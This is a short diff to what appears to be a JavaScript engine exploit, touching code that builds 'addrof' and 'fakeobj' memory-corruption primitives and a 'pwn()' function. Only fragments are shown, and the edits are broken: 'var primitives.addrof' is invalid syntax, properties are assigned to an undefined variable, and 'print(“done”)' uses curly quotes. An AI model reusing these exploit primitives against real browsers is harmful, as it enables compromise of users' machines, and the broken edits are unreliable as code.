@@ -152,8 +152,8 @@ let fakeobj = function (addr) {
   return victim[0];
 }
 var primitives;
-primitives.addrof = addrof();
-primitives.fakeobj = fakeobj();
+var primitives.addrof = addrof();
+var primitives.fakeobj = fakeobj();
 let stage1 = primitives;
 
 //
@@ -386,7 +386,7 @@ function pwn() {
             throw 'maybe later'
         },
     }
-
+print(“done”)
 
   }
 pwn();
